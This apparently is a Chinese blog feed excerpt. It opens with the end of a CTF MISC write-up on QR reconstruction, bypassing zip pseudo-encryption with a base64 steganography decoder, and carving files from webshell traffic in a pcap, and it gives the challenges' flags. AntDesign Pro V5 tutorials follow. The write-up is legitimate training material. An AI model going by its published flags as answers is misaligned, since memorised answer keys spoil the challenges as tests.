将两个图片拼接，补全定位点，得到最终的二维码。</p><p><a href="https://pic.lufer.cc/image/cYrp"><img src="https://pic.lufer.cc/images/2021/08/11/imageccebd2ad4fd981b8.th.png" alt="imageccebd2ad4fd981b8.th.png" /></a></p><p>=======<br /><img src="https://pic.lufer.cc/images/2021/08/11/image.png" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/08/11/imagefb6a4a597307f904.png" alt="" /></p><p>  将两个图片拼接，补全定位点，得到最终的二维码。</p><p><img src="https://pic.lufer.cc/images/2021/08/11/imageccebd2ad4fd981b8.png" alt="" /></p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>04caf108f0e7716a1eb5274433ae50cc1cf37cb1</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><p>  扫描后得到答案：<code>flag&#123;yanji4n_bu_we1shi&#125;</code>。</p><h1 id="base64stego"><a class="markdownIt-Anchor" href="#base64stego"></a> base64stego</h1><h2 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h2><p>  难度系数： 5.0<br />  题目来源： olympicCTF<br />  题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓<br />  题目场景： 暂无</p><h2 id="解答-11"><a class="markdownIt-Anchor" href="#解答-11"></a> 解答</h2><p>  根据题目名称，可以想到这是一道隐写题目，附件下载之后是个zip，但是解压需要密码，考虑是伪加密。</p><p>  用Winhex打开zip文件，搜索504B，可以找到结果如下。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image2b8d97fb9733f5be.png" alt="" /></p><p>  根据zip文件格式：</p><blockquote><p>压缩源文件目录区：<br />50 4B 01 02：目录中文件文件头标记(0x02014b50)<br />3F 00：压缩使用的 pkware 版本<br />14 00：解压文件所需 pkware 版本<br />00 00：全局方式位标记（有无加密，伪加密的关键）</p></blockquote><p>  可知将<code>3F031403</code>后的<code>0900</code>改为<code>0000</code>可以解除伪加密，修改之后保存文件，得到<code>stego.txt</code>。</p><p>  阅读stego的内容可发现是base64字符串，联系题干的base64隐写，借助脚本解密内容可以得到答案，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;stego.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        print([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>  得到的结果为<code>Base_sixty_four_point_five</code>，用<code>flag&#123;&#125;</code>套起来就是答案。</p><h1 id="功夫再高也怕菜刀"><a class="markdownIt-Anchor" href="#功夫再高也怕菜刀"></a> 功夫再高也怕菜刀</h1><h2 id="题目-11"><a class="markdownIt-Anchor" href="#题目-11"></a> 题目</h2><p>  难度系数： 6.0<br />  题目来源： 安恒杯<br />  题目描述：菜狗决定用菜刀和菜鸡决一死战<br />  题目场景： 暂无</p><h2 id="解答-12"><a class="markdownIt-Anchor" href="#解答-12"></a> 解答</h2><p>  题目附件给了一个.pcapng文件，是网络流量包文件，用Wireshark打开。</p><p>  在分组字节流中查找flag，可以检索到1150行有<code>flag.txt</code>字样。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image.png" alt="" /></p><p>  观察报文内容可知这里有一个jpg文件，追踪TCP流，可以看到有FFD8开头的字符串，找到FFD9结尾，并复制出来。</p><p>  这里会找到两个FFD8，但是第一个无法解析，要用后面那个长一点的。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image860b328bb1e7352e.png" alt="" /></p><p>  另存为jpg文件，可以得到图片。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/imageea60dd5b24316708.png" alt="" /></p><p>  可以得到一个密码<code>Th1s_1s_p4sswd_!!!</code>。</p><p>  继续检索<code>flag.txt</code>,可以在1367行找到一段内容。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image78c95be7ac245787.png" alt="" /></p><p>  考虑这里是一个压缩文件，将<code>-&gt;|</code>到<code>|&lt;-</code>之间的内容复制出来，用Winhex保存为zip文件。</p><p><img src="https://pic.lufer.cc/images/2021/08/10/image5d8f4ebba04021cc.png" alt="" /></p><p>  将压缩文件解压，发现需要密码，使用先前得到的密码，得到flag.txt,从而得到答案：<code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code>。</p><h2 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充</h2><p>  将pcapng直接改名为zip文件，用360压缩可以直接打开。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;this_is_flag&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#this_is_flag&quot;&gt;&lt;/a&gt; this_is_flag&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
    <category term="MISC" scheme="https://coder.lufer.cc/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>AntDesign Pro V5 到底怎么用之plugin-request</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%20Pro%20V5%20%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E7%94%A8%E4%B9%8Bplugin-request/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%20Pro%20V5%20%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E7%94%A8%E4%B9%8Bplugin-request/</id>
    <published>2021-08-05T06:10:46.000Z</published>
    <updated>2021-08-09T02:20:38.729Z</updated>
    
    <content type="html"><![CDATA[<p>  AntDesign Pro V5中，使用了<code>@umijs/plugin-request</code>来实现请求的发送，这是在先前版本的request上进行了一次包裹而来的useRequest，使用起来更加清晰一些。</p><p>  官网见：<a href="https://umijs.org/zh-CN/plugins/plugin-request">https://umijs.org/zh-CN/plugins/plugin-request</a></p><h1 id="创建请求发起函数"><a class="markdownIt-Anchor" href="#创建请求发起函数"></a> 创建请求发起函数</h1><p>  为了使代码更便于阅读，还是将请求抽离成函数来实现。</p><p>  与老版本并无不同，依然是在<code>src/services</code>下面来维护request请求的列表。如果使用了V5的脚手架，将会在<code>src/services</code>下面自动创建<code>ant-design-pro</code>和<code>swagger</code>两个文件夹，分别用于处理业务逻辑和生成接口swagger文档。</p><p>  我们在<code>src/services/ant-design-pro</code>下的<code>api.js</code>中实现一个新的函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">GetPersonIdentityBySearch</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(<span class="string">&#x27;/api/fakeget&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    data: &#123;options&#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="请求调用"><a class="markdownIt-Anchor" href="#请求调用"></a> 请求调用</h1><p>  创建好发起函数之后，就可以在useRequest中进行调用，并实现传参。<br />  在<code>IdentityModelTest.js</code>中，我实现了一个手动触发的useRequest。关于IdentityModelTest是什么，可以参考另一篇文章:<a href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%20Pro%20V5%20%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E7%94%A8%E4%B9%8Bplugin-model/">AntDesign Pro V5 到底怎么用之plugin-model</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useCallback &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">//从api.js中引入我们创建的发起函数。</span></span><br><span class="line"><span class="keyword">import</span> &#123; GetPersonIdentityBySearch &#125; <span class="keyword">from</span> <span class="string">&#x27;@/services/ant-design-pro/api&#x27;</span>;</span><br><span class="line"><span class="comment">//引入useRequest。</span></span><br><span class="line"><span class="keyword">import</span> &#123; useRequest &#125; <span class="keyword">from</span> <span class="string">&#x27;@umijs/hooks&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">IdentityModelTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [Identity,setIdentity] = useState(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">//实现一个手动触发的函数，可以通过run()来触发。</span></span><br><span class="line">  <span class="keyword">const</span> &#123; loading, run &#125; = useRequest(GetPersonIdentityBySearch,&#123;</span><br><span class="line">    manual: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//在onSuccess中的result即可获取到返回值。</span></span><br><span class="line">    onSuccess: <span class="function">(<span class="params">result, params</span>) =&gt;</span> &#123;</span><br><span class="line">      setIdentity(result);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">//根据官方说明文档，run()可以带参数，该参数将会传递到请求中。</span></span><br><span class="line">  <span class="keyword">const</span> searchIdentity = useCallback(<span class="function">(<span class="params">conditions</span>) =&gt;</span> &#123;</span><br><span class="line">    run(conditions);</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    Identity,</span><br><span class="line">    searchIdentity,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  至此完成了在需要时的请求发起，参数传递，以及返回值处理。</p><h1 id="其他请求"><a class="markdownIt-Anchor" href="#其他请求"></a> 其他请求</h1><p>  官方给出了一些直接使用useRequest发送请求的示例，但是这里要注意，如果系统检测到了第一个传入参数是字符串，将会直接发起请求，useRequest提供的其他接口例如manual，onSuccess，onError等都不会再生效，如果要使用这些API，一定要传入函数。<br />  下面是几种官方示例写法。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用法 1</span></span><br><span class="line"><span class="keyword">const</span> &#123; data, error, loading &#125; = useRequest(<span class="string">&#x27;/api/userInfo&#x27;</span>);</span><br><span class="line">​</span><br><span class="line"><span class="comment">// 用法 2</span></span><br><span class="line"><span class="keyword">const</span> &#123; data, error, loading &#125; = useRequest(&#123;</span><br><span class="line">  url: <span class="string">&#x27;/api/changeUsername&#x27;</span>,</span><br><span class="line">  method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line">​</span><br><span class="line"><span class="comment">// 用法 3</span></span><br><span class="line"><span class="keyword">const</span> &#123; data, error, loading, run &#125; = useRequest(<span class="function">(<span class="params">userId</span>)=&gt;</span> <span class="string">`/api/userInfo/<span class="subst">$&#123;userId&#125;</span>`</span>);</span><br><span class="line">​</span><br><span class="line"><span class="comment">// 用法 4</span></span><br><span class="line"><span class="keyword">const</span> &#123; loading, run &#125; = useRequest(<span class="function">(<span class="params">username</span>) =&gt;</span> (&#123;</span><br><span class="line">  url: <span class="string">&#x27;/api/changeUsername&#x27;</span>,</span><br><span class="line">  method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">  data: &#123; username &#125;,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  AntDesign Pro V5中，使用了&lt;code&gt;@umijs/plugin-request&lt;/code&gt;来实现请求的发送，这是在先前版本的request上进行了一次包裹而来的useRequest，使用起来更加清晰一些。&lt;/p&gt;
&lt;p&gt;  官网见：&lt;a href=&quot;</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="React" scheme="https://coder.lufer.cc/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>置顶提示</title>
    <link href="https://coder.lufer.cc/%E7%BD%AE%E9%A1%B6%E6%8F%90%E7%A4%BA/"/>
    <id>https://coder.lufer.cc/%E7%BD%AE%E9%A1%B6%E6%8F%90%E7%A4%BA/</id>
    <published>2021-08-05T03:25:31.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<p>  如果访问本站时发现加载不出图片，请访问一次 <a href="http://pic.lufer.cc">pic.lufer.cc</a> ，可能被CloudFlare的认证机制拦截，需手动访问一次解除拦截。</p><p>  如果pic.lufer.cc无法访问，请发送邮件至lufer@lufer.cc通知我。</p><p>  如果网站有其他问题或有其他想法，也欢迎发送邮件至lufer@lufer.cc。</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p&gt;  如果访问本站时发现加载不出图片，请访问一次 &lt;a href=&quot;http://pic.lufer.cc&quot;&gt;pic.lufer.cc&lt;/a&gt; ，可能被CloudFlare的认证机制拦截，需手动访问一次解除拦截。&lt;/p&gt;
&lt;p&gt;  如果pic.lufer.cc无法访问，请发送邮件至lufer@lufer.cc通知我。&lt;/p&gt;
&lt;p&gt;  如果网站有其他问题或有其他想法，也欢迎发送邮件至lufer@lufer.cc。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>AntDesign Pro V5 到底怎么用之plugin-model</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%20Pro%20V5%20%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E7%94%A8%E4%B9%8Bplugin-model/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%20Pro%20V5%20%E5%88%B0%E5%BA%95%E6%80%8E%E4%B9%88%E7%94%A8%E4%B9%8Bplugin-model/</id>
    <published>2021-08-05T02:26:22.000Z</published>
    <updated>2021-08-05T07:40:22.524Z</updated>
    
    <content type="html"><![CDATA[<p>  在AntDesign Pro v5中，抛弃了先前的<code>Dva</code>,不再使用原先的数据流方案，而是使用了<code>@umijs/plugin-model</code>。</p><p>  官方网址见：<a href="https://umijs.org/zh-CN/plugins/plugin-model">https://umijs.org/zh-CN/plugins/plugin-model</a></p><h1 id="创建model"><a class="markdownIt-Anchor" href="#创建model"></a> 创建Model</h1><p>  在<code>src/models</code>下面创建model文件，按照官方的说法，只要创建的model符合hooks model的规范，就可以自动检测到，文件名则对应最终 model 的 name。<br />  这里我们新建一个叫做<code>IdentityModelTest.js</code>的文件。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useCallback &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">//这是我自己写的一个request请求函数，具体可见另一篇关于useRequest的介绍。</span></span><br><span class="line"><span class="keyword">import</span> &#123; GetPersonIdentityBySearch &#125; <span class="keyword">from</span> <span class="string">&#x27;@/services/ant-design-pro/api&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useRequest &#125; <span class="keyword">from</span> <span class="string">&#x27;@umijs/hooks&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">IdentityModelTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//创建一个名为Identity的State，并配套一个setIdentity的方法用于更新State。</span></span><br><span class="line">  <span class="keyword">const</span> [Identity,setIdentity] = useState(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">//这是一个发起请求的手动触发函数，并在成功后通过setIdentity更新了State。</span></span><br><span class="line">  <span class="keyword">const</span> &#123; loading, run &#125; = useRequest(GetPersonIdentityBySearch,&#123;</span><br><span class="line">    manual: <span class="literal">true</span>,</span><br><span class="line">    onSuccess: <span class="function">(<span class="params">result, params</span>) =&gt;</span> &#123;</span><br><span class="line">      setIdentity(result);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">//定义一个方法searchIdentity，并传入参数conditions。</span></span><br><span class="line">  <span class="keyword">const</span> searchIdentity = useCallback(<span class="function">(<span class="params">conditions</span>) =&gt;</span> &#123;</span><br><span class="line">    run(conditions);</span><br><span class="line">  &#125;, [])</span><br><span class="line">  <span class="comment">//决定了向外暴露的值和方法。</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    Identity,</span><br><span class="line">    searchIdentity,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  其实这个model和Dva时期的model功能上来讲都差不多，定义state，通过操作更改state，只不过把fetch和reducer改成了useRequest和setState。</p><h1 id="使用model"><a class="markdownIt-Anchor" href="#使用model"></a> 使用Model</h1><p>  有了Model之后，就可以在具体的业务场景中进行消费使用，并且在model的state更新之后，也会同步触发页面的更新。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入useModel才能使用model</span></span><br><span class="line"><span class="keyword">import</span> &#123; useModel &#125; <span class="keyword">from</span> <span class="string">&#x27;umi&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">//通过useModel(&#x27;Model名&#x27;)来使用Model，并解构其暴露出来的值或方法。</span></span><br><span class="line">    <span class="keyword">const</span> &#123; Identity,searchIdentity&#125; = useModel(<span class="string">&#x27;IdentityModelTest&#x27;</span>);  </span><br><span class="line">    <span class="comment">//此时就可以通过暴露出来的接口传参并执行相关的业务逻辑。</span></span><br><span class="line">    searchIdentity(value);</span><br><span class="line">    <span class="comment">//Identity也可以直接使用。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  在AntDesign Pro v5中，抛弃了先前的&lt;code&gt;Dva&lt;/code&gt;,不再使用原先的数据流方案，而是使用了&lt;code&gt;@umijs/plugin-model&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;  官方网址见：&lt;a href=&quot;https://umijs.org</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="React" scheme="https://coder.lufer.cc/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>AntDesign Pro V5 踩坑指南</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesignProV5%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesignProV5%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/</id>
    <published>2021-07-30T08:37:50.000Z</published>
    <updated>2021-12-17T03:59:35.915Z</updated>
    
    <content type="html"><![CDATA[<p>  最近又在写前端了，掏出了祖传的AntD，发现已经更新到5.0版本了，而且通过umi安装的话是选不了老版本的。<br />  新版本怎么说呢，用起来真是坑坑洼洼的，而且官网文档写的一言难尽，有些东西他写了，但又没完全写，你看懂了，但又没完全看懂。<br />  记录一下V5版本和旧版本的一些不同之处。</p><h1 id="全局化配置"><a class="markdownIt-Anchor" href="#全局化配置"></a> 全局化配置</h1><h2 id="样式配置与快速生成"><a class="markdownIt-Anchor" href="#样式配置与快速生成"></a> 样式配置与快速生成</h2><p>  V5版本把全局化配置抽离出来，放在了<code>\config\defaultSettings.js</code>文件下,可以通过<code>https://preview.pro.ant.design</code>右侧的齿轮快速的生成配置Json，然后放到<code>defaultSettings.js</code>里面。</p><h2 id="去掉全球化与修改页脚"><a class="markdownIt-Anchor" href="#去掉全球化与修改页脚"></a> 去掉全球化与修改页脚</h2><p>  我这小项目估计也没有外国人看了，关掉全球化省的控制台一直报Warning。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config\config.js</span></span><br><span class="line">layout: &#123;</span><br><span class="line">    locale: <span class="literal">false</span>,   <span class="comment">//locale改为false</span></span><br><span class="line">    siderWidth: <span class="number">208</span>,</span><br><span class="line">    ...defaultSettings,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>  页脚在Footer里面，改成自己的公司名。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src\components\Footer\index.jsx</span></span><br><span class="line"><span class="keyword">import</span> &#123; useIntl &#125; <span class="keyword">from</span> <span class="string">&#x27;umi&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; GithubOutlined &#125; <span class="keyword">from</span> <span class="string">&#x27;@ant-design/icons&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; DefaultFooter &#125; <span class="keyword">from</span> <span class="string">&#x27;@ant-design/pro-layout&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> intl = useIntl();</span><br><span class="line">  <span class="comment">// const defaultMessage = intl.formatMessage(&#123;</span></span><br><span class="line">  <span class="comment">//   id: &#x27;app.copyright.produced&#x27;,</span></span><br><span class="line">  <span class="comment">//   defaultMessage: &#x27;蚂蚁集团体验技术部出品&#x27;,</span></span><br><span class="line">  <span class="comment">// &#125;);</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;DefaultFooter</span><br><span class="line">      copyright=&#123;<span class="string">`2021 - 中国烟草总公司云南省公司`</span>&#125;</span><br><span class="line">      links=&#123;[</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// key: &#x27;Ant Design Pro&#x27;,</span></span><br><span class="line">          <span class="comment">// title: &#x27;Ant Design Pro&#x27;,</span></span><br><span class="line">          <span class="comment">// href: &#x27;https://pro.ant.design&#x27;,</span></span><br><span class="line">          <span class="comment">// blankTarget: true,</span></span><br><span class="line">        &#125;,</span><br><span class="line">      ]&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="菜单与路由"><a class="markdownIt-Anchor" href="#菜单与路由"></a> 菜单与路由</h1><p>  我记得V2的时候还要在<code>src\commom\</code>下面写<code>menu.js</code>和<code>routes.js</code>。<br />  在V4的时候已经抽离到了<code>config\config.js</code>里面。<br />  这次的V5将routes.js提取包装成独立文件，然后再config.js里面引用了。这样确实好一些，不然config.js就太乱了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config\config.js</span></span><br><span class="line"><span class="keyword">import</span> routes <span class="keyword">from</span> <span class="string">&#x27;./routes&#x27;</span>;</span><br><span class="line">  ......</span><br><span class="line"><span class="comment">// umi routes: https://umijs.org/docs/routing</span></span><br><span class="line">  routes,</span><br></pre></td></tr></table></figure><p>  这里我脑瘫了一次，我在routes里面写子菜单的时候，没给父级菜单写path，结果导致了一个很牛的BUG，就是所有的菜单只有第一个嵌套子菜单可以显示，再往下的菜单点了之后一个页面都加载不出来，而在这项之前的菜单不受影响。<br />  正确写法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config\routes.js</span></span><br><span class="line">&#123;</span><br><span class="line">    name: <span class="string">&#x27;主体管理&#x27;</span>,</span><br><span class="line">    icon: <span class="string">&#x27;table&#x27;</span>,</span><br><span class="line">    path:<span class="string">&#x27;/Identity&#x27;</span>,</span><br><span class="line">    access:<span class="string">&#x27;canAdmin&#x27;</span>,</span><br><span class="line">    routes:[</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">&#x27;自然人主体管理&#x27;</span>,</span><br><span class="line">        icon: <span class="string">&#x27;table&#x27;</span>,</span><br><span class="line">        path: <span class="string">&#x27;/Identity/Person&#x27;</span>,</span><br><span class="line">        component: <span class="string">&#x27;./Admin/Identity/IdentityofPerson&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">&#x27;组织机构主体管理&#x27;</span>,</span><br><span class="line">        icon: <span class="string">&#x27;table&#x27;</span>,</span><br><span class="line">        path: <span class="string">&#x27;/Identity/Org&#x27;</span>,</span><br><span class="line">        component: <span class="string">&#x27;./Admin/Identity/IdentityofOrg&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h1 id="菜单与路由的权限设置"><a class="markdownIt-Anchor" href="#菜单与路由的权限设置"></a> 菜单与路由的权限设置</h1><p>  在老版本中，路由权限是在routes下面写authority来实现的，贴一个老的例子。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">routes: [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        component: <span class="string">&#x27;../layouts/BasicLayout&#x27;</span>,</span><br><span class="line">        authority: [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>],  <span class="comment">//通过authority设置可访问的用户类别。</span></span><br><span class="line">        routes: [</span><br><span class="line">        &#123;</span><br><span class="line">            path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            redirect: <span class="string">&#x27;/user/login&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path: <span class="string">&#x27;/welcome&#x27;</span>,</span><br><span class="line">            name: <span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line">            icon: <span class="string">&#x27;smile&#x27;</span>,</span><br><span class="line">            component: <span class="string">&#x27;./Welcome&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>  在V5中，官方使用了<code>@umijs/plugin-access</code>来实现权限控制，老的<code>Authority.js</code>组件也已经被删掉了。官方文档见<code>https://pro.ant.design/zh-CN/docs/authority-management</code>。</p><p>  首先修改access.js，添加一个我们自己的鉴权逻辑。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src\access.js</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see </span>https://umijs.org/zh-CN/plugins/plugin-access</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">access</span>(<span class="params">initialState</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; currentUser &#125; = initialState || &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    canAdmin: currentUser &amp;&amp; currentUser.access === <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">     <span class="comment">//这里是返回的用户数据里面有一个access字段，通过是admin还是user来表示用户权限，所以添加了一个canUser的promise，检查用户权限组是否为user。</span></span><br><span class="line">    canUser:currentUser &amp;&amp; currentUser.access === <span class="string">&#x27;user&#x27;</span> </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  然后只需要在<code>routes.js</code>里面设置<code>access</code>需要调用的promise即可。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config\routes/js</span></span><br><span class="line">&#123;</span><br><span class="line">    name: <span class="string">&#x27;主体管理&#x27;</span>,</span><br><span class="line">    icon: <span class="string">&#x27;table&#x27;</span>,</span><br><span class="line">    path:<span class="string">&#x27;/Identity&#x27;</span>,</span><br><span class="line">    access:<span class="string">&#x27;canAdmin&#x27;</span>,          <span class="comment">//调用canAdmin来检查是否符合管理员权限</span></span><br><span class="line">    routes:[</span><br><span class="line">        ......</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">&#x27;个人中心&#x27;</span>,</span><br><span class="line">    icon: <span class="string">&#x27;table&#x27;</span>,</span><br><span class="line">    access:<span class="string">&#x27;canUser&#x27;</span>,           <span class="comment">//调用canUser来检查是否符合用户权限。</span></span><br><span class="line">    path: <span class="string">&#x27;/Account&#x27;</span>,  </span><br><span class="line">    component: <span 